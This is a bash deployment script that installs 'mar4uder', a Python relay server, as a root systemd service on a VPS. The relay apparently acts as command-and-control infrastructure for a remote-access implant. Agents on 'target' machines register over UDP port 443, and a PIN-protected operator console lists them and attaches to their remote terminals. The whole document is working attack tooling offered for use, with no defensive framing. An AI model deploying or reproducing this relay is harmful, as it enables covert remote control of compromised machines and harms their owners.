#!/bin/bash
set -e

echo "=============================================="
echo "   MAR4UDER RELAY AUTO-DEPLOYMENT FOR VPS     "
echo "=============================================="

# 1. Ensure python3 is available (fallback to apt if missing)
if ! command -v python3 &> /dev/null; then
    echo "[*] python3 not found, installing..."
    apt-get update -y && apt-get install -y python3
else
    echo "[+] python3 is already installed: $(python3 --version)"
fi

# 2. Stop old service if running
systemctl stop mar4uder-relay 2>/dev/null || true

# 3. Create directory
mkdir -p /opt/mar4uder/server

# 4. Write relay_server.py
cat << 'EOF_RELAY' > /opt/mar4uder/server/relay_server.py
#!/usr/bin/env python3
import sys
import os
import time
import struct
import asyncio
import argparse
from typing import Dict, Tuple, Optional

MAR4UDER_MAGIC = 0x4D345244
PROTOCOL_VERSION = 1

MSG_HEARTBEAT     = 0x01
MSG_REGISTER      = 0x02
MSG_SESSION_OPEN  = 0x03
MSG_PTY_DATA      = 0x04
MSG_PTY_RESIZE    = 0x05
MSG_SESSION_CLOSE = 0x06

HEADER_FORMAT = "<IBBHII"
HEADER_SIZE = struct.calcsize(HEADER_FORMAT)

class NodeSession:
    def __init__(self, node_id: str, hostname: str, os_info: str, addr: Tuple[str, int]):
        self.node_id = node_id
        self.hostname = hostname
        self.os_info = os_info
        self.addr = addr
        self.last_seen = time.time()
        self.active_session_id = 0
        self.operator_writer: Optional[asyncio.StreamWriter] = None
        self.cols = 80
        self.rows = 24

    def is_alive(self, timeout=15) -> bool:
        return (time.time() - self.last_seen) < timeout

class UDPProtocol(asyncio.DatagramProtocol):
    def __init__(self, server: "Mar4uderRelay"):
        self.server = server
        self.transport: Optional[asyncio.DatagramTransport] = None

    def connection_made(self, transport: asyncio.DatagramTransport):
        self.transport = transport

    def datagram_received(self, data: bytes, addr: Tuple[str, int]):
        if len(data) < HEADER_SIZE:
            return

        magic, version, msg_type, flags, session_id, seq = struct.unpack_from(HEADER_FORMAT, data, 0)
        if magic != MAR4UDER_MAGIC or version != PROTOCOL_VERSION:
            return

        payload = data[HEADER_SIZE:]
        self.server.handle_agent_packet(msg_type, session_id, payload, addr)

    def error_received(self, exc):
        print(f"[-] UDP error: {exc}", file=sys.stderr)

class Mar4uderRelay:
    def __init__(self, udp_port: int, tcp_port: int, pin: str):
        self.udp_port = udp_port
        self.tcp_port = tcp_port
        self.pin = pin
        self.nodes: Dict[str, NodeSession] = {}
        self.addr_to_node: Dict[Tuple[str, int], str] = {}
        self.udp_transport: Optional[asyncio.DatagramTransport] = None

    def send_to_node(self, node: NodeSession, msg_type: int, payload: bytes = b"", session_id: int = 0):
        if not self.udp_transport:
            return
        header = struct.pack(HEADER_FORMAT, MAR4UDER_MAGIC, PROTOCOL_VERSION, msg_type, 0, session_id, 0)
        self.udp_transport.sendto(header + payload, node.addr)

    def handle_agent_packet(self, msg_type: int, session_id: int, payload: bytes, addr: Tuple[str, int]):
        if msg_type == MSG_REGISTER:
            if len(payload) >= 192:
                node_id = payload[0:64].split(b"\x00", 1)[0].decode("utf-8", errors="replace")
                hostname = payload[64:128].split(b"\x00", 1)[0].decode("utf-8", errors="replace")
                os_info = payload[128:192].split(b"\x00", 1)[0].decode("utf-8", errors="replace")

                node = self.nodes.get(node_id)
                if not node:
                    node = NodeSession(node_id, hostname, os_info, addr)
                    self.nodes[node_id] = node
                    print(f"[+] New node registered: [{node_id}] from {addr[0]}:{addr[1]}")
                else:
                    node.addr = addr
                    node.hostname = hostname
                    node.os_info = os_info
                    node.last_seen = time.time()

                self.addr_to_node[addr] = node_id
                self.send_to_node(node, MSG_HEARTBEAT, b"", 0)

        elif msg_type == MSG_HEARTBEAT:
            node_id = self.addr_to_node.get(addr)
            if node_id and node_id in self.nodes:
                node = self.nodes[node_id]
                node.last_seen = time.time()
                node.addr = addr
                self.send_to_node(node, MSG_HEARTBEAT, b"", 0)

        elif msg_type == MSG_PTY_DATA:
            node_id = self.addr_to_node.get(addr)
            if node_id and node_id in self.nodes:
                node = self.nodes[node_id]
                node.last_seen = time.time()
                if node.operator_writer and not node.operator_writer.is_closing():
                    try:
                        node.operator_writer.write(payload)
                    except Exception as e:
                        print(f"[-] Failed to write to operator: {e}")

        elif msg_type == MSG_SESSION_CLOSE:
            node_id = self.addr_to_node.get(addr)
            if node_id and node_id in self.nodes:
                node = self.nodes[node_id]
                if node.operator_writer and not node.operator_writer.is_closing():
                    node.operator_writer.write(b"\r\n\x1b[33m[*] Remote session terminated by target.\x1b[0m\r\n")
                node.operator_writer = None
                node.active_session_id = 0

    async def handle_operator_client(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        addr = writer.get_extra_info("peername")
        print(f"[+] Operator connection from {addr}")

        authenticated = False
        writer.write(b"\r\n\x1b[1;36m=== MAR4UDER RELAY CONSOLE ===\x1b[0m\r\n")
        for attempt in range(3):
            writer.write(b"Enter Security PIN: ")
            await writer.drain()

            line = await reader.readline()
            if not line:
                writer.close()
                return

            entered_pin = line.decode("utf-8", errors="ignore").strip()
            if entered_pin == self.pin:
                authenticated = True
                break
            else:
                writer.write(b"\x1b[31m[!] Invalid PIN code.\x1b[0m\r\n")
                await writer.drain()

        if not authenticated:
            writer.write(b"\x1b[31m[!] Access Denied. Disconnecting.\x1b[0m\r\n")
            await writer.drain()
            writer.close()
            return

        active_node: Optional[NodeSession] = None
        while not writer.is_closing():
            if active_node is None:
                writer.write(b"\x1b[2J\x1b[H")
                writer.write(b"\x1b[1;32m")
                writer.write(b"+--------------------------------------------------------------------------------+\r\n")
                writer.write(b"|                           MAR4UDER RELAY DASHBOARD                             |\r\n")
                writer.write(b"+--------------------------------------------------------------------------------+\x1b[0m\r\n")
                writer.write(f" Status: ACTIVE | PIN: OK | Connected: {addr[0]}:{addr[1]}\r\n\r\n".encode())

                node_list = list(self.nodes.values())
                writer.write(b"\x1b[1m  #   NODE ID              HOSTNAME             OS             LAST SEEN   STATUS\x1b[0m\r\n")
                writer.write(b"  --  -------------------  -------------------  -------------  ----------  -------\r\n")

                if not node_list:
                    writer.write(b"  (No active nodes connected yet. Start an agent to see it here)\r\n")
                else:
                    for idx, node in enumerate(node_list, 1):
                        delta = int(time.time() - node.last_seen)
                        status = "\x1b[32mONLINE\x1b[0m" if node.is_alive() else "\x1b[31mOFFLINE\x1b[0m"
                        line = f" [{idx:<2}] {node.node_id:<20.20} {node.hostname:<20.20} {node.os_info:<14.14} {delta:>5}s ago  {status}\r\n"
                        writer.write(line.encode("utf-8", errors="replace"))

                writer.write(b"\r\n\x1b[1;33mCommands:\x1b[0m\r\n")
                writer.write(b"  <number> - Connect to node terminal (e.g. '1')\r\n")
                writer.write(b"  r        - Refresh list\r\n")
                writer.write(b"  q        - Exit console\r\n\r\n")
                writer.write(b"mar4uder> ")
                await writer.drain()

                cmd_line = await reader.readline()
                if not cmd_line:
                    break

                cmd = cmd_line.decode("utf-8", errors="ignore").strip()
                if cmd.lower() == "q":
                    writer.write(b"Goodbye.\r\n")
                    await writer.drain()
                    break
                elif cmd.lower() == "r" or cmd == "":
                    continue

                if cmd.isdigit():
                    idx = int(cmd)
                    if 1 <= idx <= len(node_list):
                        target_node = node_list[idx - 1]
                        if not target_node.is_alive():
                            writer.write(b"\x1b[31m[!] Selected node is offline.\x1b[0m\r\n")
                            await writer.drain()
                            await asyncio.sleep(1)
                            continue

                        active_node = target_node
                        active_node.operator_writer = writer
                        active_node.active_session_id = int(time.time()) & 0xFFFFFFFF

                        resize_payload = struct.pack("<HH", 80, 24)
                        self.send_to_node(active_node, MSG_SESSION_OPEN, resize_payload, active_node.active_session_id)

                        writer.write(f"\r\n\x1b[32m[+] Attached to [{active_node.node_id}]. Press 'Ctrl+]' to detach.\x1b[0m\r\n\r\n".encode())
                        await writer.drain()
                    else:
                        writer.write(b"\x1b[31m[!] Invalid index.\x1b[0m\r\n")
                        await writer.drain()
                        await asyncio.sleep(1)

            else:
                try:
                    data = await reader.read(1024)
                    if not data:
                        break

                    if b"\x1d" in data:
                        writer.write(b"\r\n\x1b[33m[*] Detached from remote terminal.\x1b[0m\r\n")
                        await writer.drain()
                        if active_node:
                            self.send_to_node(active_node, MSG_SESSION_CLOSE, b"", active_node.active_session_id)
                            active_node.operator_writer = None
                            active_node = None
                        await asyncio.sleep(0.5)
                        continue

                    if data.startswith(b"/resize ") or data.startswith(b"/size "):
                        parts = data.decode("utf-8", errors="ignore").strip().split()
                        if len(parts) >= 3 and parts[1].isdigit() and parts[2].isdigit():
                            cols, rows = int(parts[1]), int(parts[2])
                            resize_payload = struct.pack("<HH", cols, rows)
                            if active_node:
                                self.send_to_node(active_node, MSG_PTY_RESIZE, resize_payload, active_node.active_session_id)
                                writer.write(f"\r\n\x1b[32m[+] Window resized to {cols}x{rows}\x1b[0m\r\n".encode())
                                await writer.drain()
                            continue

                    if active_node:
                        self.send_to_node(active_node, MSG_PTY_DATA, data, active_node.active_session_id)

                except Exception as e:
                    print(f"[-] Session error: {e}")
                    break

        if active_node:
            active_node.operator_writer = None
        writer.close()

    async def start(self):
        loop = asyncio.get_running_loop()

        transport, _ = await loop.create_datagram_endpoint(
            lambda: UDPProtocol(self),
            local_addr=("0.0.0.0", self.udp_port)
        )
        self.udp_transport = transport
        print(f"[+] UDP Relay Beacon listening on 0.0.0.0:{self.udp_port}")

        tcp_server = await asyncio.start_server(
            self.handle_operator_client,
            "0.0.0.0",
            self.tcp_port
        )
        print(f"[+] TCP Operator Console listening on 0.0.0.0:{self.tcp_port} (PIN: {self.pin})")

        async with tcp_server:
            await tcp_server.serve_forever()

def main():
    parser = argparse.ArgumentParser(description="mar4uder Resilient Terminal Relay Server")
    parser.add_argument("--udp-port", type=int, default=443)
    parser.add_argument("--tcp-port", type=int, default=9000)
    parser.add_argument("--pin", type=str, default="1337")
    args = parser.parse_args()

    relay = Mar4uderRelay(udp_port=args.udp_port, tcp_port=args.tcp_port, pin=args.pin)
    try:
        asyncio.run(relay.start())
    except KeyboardInterrupt:
        print("\n[*] Relay shutting down...")

if __name__ == "__main__":
    main()
EOF_RELAY

chmod +x /opt/mar4uder/server/relay_server.py

# 5. Write systemd unit
cat << 'EOF_SERVICE' > /etc/systemd/system/mar4uder-relay.service
[Unit]
Description=mar4uder Resilient Terminal Relay Server
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/mar4uder
ExecStart=/usr/bin/python3 /opt/mar4uder/server/relay_server.py --udp-port 443 --tcp-port 9000 --pin 1337
Restart=always
RestartSec=3
LimitNOFILE=65535

[Install]
WantedBy=multi-user.target
EOF_SERVICE

# 6. Reload and launch service
systemctl daemon-reload
systemctl enable mar4uder-relay
systemctl restart mar4uder-relay

echo ""
echo "[+] SUCCESS: mar4uder Relay is running in background!"
systemctl status mar4uder-relay --no-pager
